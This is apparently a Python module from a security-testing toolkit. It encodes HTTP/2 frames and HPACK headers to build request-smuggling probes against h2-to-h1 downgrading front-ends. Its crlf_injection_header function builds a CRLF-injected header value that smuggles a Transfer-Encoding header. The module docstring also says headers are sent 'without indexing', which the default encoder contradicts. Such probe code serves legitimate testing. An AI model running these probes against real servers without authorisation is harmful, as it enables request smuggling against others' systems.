"""Minimal HTTP/2 wire codec for downgrade (h2 -> h1) smuggling probes.

Only what a probe needs is implemented — no dynamic table, no flow-control
state machine — so the surface stays auditable:

  * client connection preface + SETTINGS / HEADERS frame encoding
  * HPACK literal header fields without indexing (prefix-integers and
    Huffman-free string literals)
  * encoding CR/LF inside a header value, which a vulnerable h2->h1
    downgrade front-end may emit as a real line break on the h1 hop

The codec is pure and covered by unit tests. Driving it against a live
target requires an h2-terminating front-end (the bundled loopback lab is
h1-only), so this module is exercised at the codec level, not end-to-end.
"""

from __future__ import annotations

from dataclasses import dataclass

H2_PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"

# Frame types
FRAME_DATA = 0x0
FRAME_HEADERS = 0x1
FRAME_SETTINGS = 0x4
FRAME_GOAWAY = 0x7
FRAME_RST_STREAM = 0x3

# Flags
FLAG_END_HEADERS = 0x4
FLAG_END_STREAM = 0x1


def encode_int(value: int, prefix_bits: int, prefix_byte: int) -> bytes:
    """HPACK integer representation (RFC 7541 §5.1)."""
    max_prefix = (1 << prefix_bits) - 1
    if value < max_prefix:
        return bytes([prefix_byte | value])
    out = [prefix_byte | max_prefix]
    value -= max_prefix
    while value >= 128:
        out.append((value % 128) | 0x80)
        value //= 128
    out.append(value)
    return bytes(out)


def encode_string_literal(data: bytes) -> bytes:
    """Non-Huffman HPACK string literal (H bit clear)."""
    return encode_int(len(data), 7, 0x00) + data


def encode_literal_header(name: bytes, value: bytes,
                          never_indexed: bool = False) -> bytes:
    """Literal header field. Default uses incremental indexing (0x40,
    prefix 6); never-indexed uses 0x10 (prefix 4) for sensitive values."""
    if never_indexed:
        head = encode_int(0, 4, 0x10)
    else:
        head = encode_int(0, 6, 0x40)  # index 0 -> literal name
    return head + encode_string_literal(name) + encode_string_literal(value)


def encode_headers_block(headers: list[tuple[bytes, bytes]]) -> bytes:
    return b"".join(encode_literal_header(n, v) for n, v in headers)


def frame(frame_type: int, flags: int, stream_id: int,
         payload: bytes) -> bytes:
    """Build one h2 frame. Stream id is 31-bit (reserved bit clear)."""
    if len(payload) >= 1 << 24:
        raise ValueError("frame payload too large")
    header = len(payload).to_bytes(3, "big")
    header += bytes([frame_type, flags])
    header += (stream_id & 0x7FFFFFFF).to_bytes(4, "big")
    return header + payload


def settings_frame(ack: bool = False) -> bytes:
    flags = 0x1 if ack else 0x0
    return frame(FRAME_SETTINGS, flags, 0, b"")


def headers_frame(stream_id: int, headers_block: bytes,
                  end_stream: bool = True) -> bytes:
    flags = FLAG_END_HEADERS | (FLAG_END_STREAM if end_stream else 0)
    return frame(FRAME_HEADERS, flags, stream_id, headers_block)


def goaway_frame(last_stream_id: int, error_code: int = 0,
                 debug: bytes = b"") -> bytes:
    payload = (last_stream_id & 0x7FFFFFFF).to_bytes(4, "big")
    payload += error_code.to_bytes(4, "big") + debug
    return frame(FRAME_GOAWAY, 0, 0, payload)


@dataclass
class H2Probe:
    """A complete h2 request: preface, settings, one HEADERS frame."""

    headers: list[tuple[bytes, bytes]]
    stream_id: int = 1
    end_stream: bool = True

    def to_bytes(self) -> bytes:
        block = encode_headers_block(self.headers)
        return (H2_PREFACE + settings_frame()
                + headers_frame(self.stream_id, block, self.end_stream))


def build_downgrade_probe(method: str = "GET", path: str = "/",
                          scheme: str = "https", authority: str = "lab",
                          injected_header: tuple[bytes, bytes] | None = None
                          ) -> H2Probe:
    """Construct an h2 request carrying a header value with embedded CRLF.

    On a correctly implemented h2 front-end the value is rejected or
    re-encoded safely. A vulnerable downgrade path emits the CR/LF as a real
    header boundary when rebuilding the message as HTTP/1.1.
    """
    headers = [
        (b":method", method.encode()),
        (b":path", path.encode()),
        (b":scheme", scheme.encode()),
        (b":authority", authority.encode()),
    ]
    if injected_header is not None:
        headers.append(injected_header)
    return H2Probe(headers=headers)


def crlf_injection_header(marker: str) -> tuple[bytes, bytes]:
    """The classic h2->h1 TE smuggling carrier: an X- header whose value
    closes the line and starts a Transfer-Encoding header on the h1 hop."""
    value = (b"x\r\nTransfer-Encoding: chunked\r\n"
             b"X-Smuggler-Marker: " + marker.encode())
    return b"X-Forwarded-For", value
